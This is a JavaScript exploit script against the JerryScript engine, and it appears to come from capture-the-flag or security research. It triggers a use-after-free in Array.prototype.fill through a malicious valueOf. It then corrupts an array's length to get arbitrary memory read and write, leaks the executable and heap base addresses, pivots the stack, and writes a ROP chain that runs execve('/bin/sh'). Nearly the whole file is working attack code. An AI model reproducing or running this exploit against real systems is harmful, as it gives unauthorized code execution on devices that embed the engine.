// helper functions
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function hex(val){return "0x" + val.toString(16);}
function ftoi64(val){f64_buf[0] = val;return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);}
function ftoi32(val){f64_buf[0] = val;return BigInt(u64_buf[0]);}
function itof(val){u64_buf[0] = Number(val & 0xffffffffn);u64_buf[1] = Number(val >> 32n);return f64_buf[0];}

// prepare target arrays
var a = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16];
var victim;

// this is called by ecma_builtin_array_prototype_fill when normalizing ["1"] to an array index
Array.prototype.valueOf = function(){
  print("valueOf() called");
  // pop reallocates the array backing store, freeing memory
  a.pop();
  a.pop();
  a.pop();
  a.pop();
  a.pop();
  a.pop();
  a.pop();
  a.pop();
  // reclaiming the freed memory with an array
  victim = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16];
  return 10;
}

// after normalization of ["1"] this effectively is a.fill(0x20, 10, 11), just overwriting the size of the array victim with 0x20<<4
a.fill(0x20, ["1"], 11);
print("length of array c after fill: ", victim.length);

// creating a bunch of 64 bit values to act as fake objects
var fakeobjs = [
  itof(0x4141414141414140n),
  itof(0x4141414141414142n),
  itof(0x4141414141414143n),
  itof(0x4141414141414144n),
  itof(0x4141414141414145n),
  itof(0x4141414141414146n),
  itof(0x4141414141414147n),
  itof(0x4141414141414148n),
  itof(0x00000A2200000A22n), // this is the compressed pointer to the first element of victim, writing to this allows changing what victim[0] points to, creating sandbox r/w
  itof(0x414141414141414An),
  itof(0x414141414141414Bn),
  itof(0x414141414141414Cn),
  itof(0x414141414141414Dn),
  itof(0x414141414141414En),
  itof(0x414141414141414Fn),
  itof(0x4141414141414150n),
  itof(0x4141414141414151n),
  itof(0x4141414141414152n),
  itof(0x4141414141414153n),
  itof(0x4141414141414154n),
  itof(0x4141414141414155n),
  itof(0x4141414141414156n),
  itof(0x4141414141414157n),
];

function sbx_w64(addr, content){
  var addr_compressed = addr|2n;
  victim[46] = itof(addr_compressed);
  victim[0] = itof(content);
};

function sbx_r64(addr){
  var addr_compressed = addr|2n;
  victim[46] = itof(addr_compressed);
  return ftoi64(victim[0]);
};

print("sanity check: ", hex(ftoi64(victim[46])));
var base = sbx_r64(0x1C8n)-0x4F94En;
var heap_base = base+0x721A0n;
print("base of the jerry executable: ", hex(base));
print("base of the jerry heap: ", hex(heap_base));

// stack pivot
sbx_w64(0x1C8n, base+0x00045F87n);  // leave; ret;
sbx_w64(0x1B8n, base+0x000595d1n);  // pop rbp; pop r12; pop r13; pop r14; ret;

// do the actual ropchain
sbx_w64(0x38n, 0x68732F6E69622Fn);  // write the /bin/sh string to memory
sbx_w64(0x1E0n, base+0x0005927An);  // pop rdi; ret;
sbx_w64(0x1E8n, heap_base+0x038n);  // &/bin/sh
sbx_w64(0x1F0n, base+0x000595D7n);  // pop rsi; ret;
sbx_w64(0x1F8n, heap_base+0x018n);  // NULL
sbx_w64(0x200n, base+0x00056F1En);  // pop rdx; ret;
sbx_w64(0x208n, heap_base+0x018n);  // NULL
sbx_w64(0x210n, base+0x000565b7n);  // pop rax; ret;
sbx_w64(0x218n, 0x000000000003bn);  // sys_execve
sbx_w64(0x220n, base+0x0002125en);  // syscall

print(123);
for(;;);
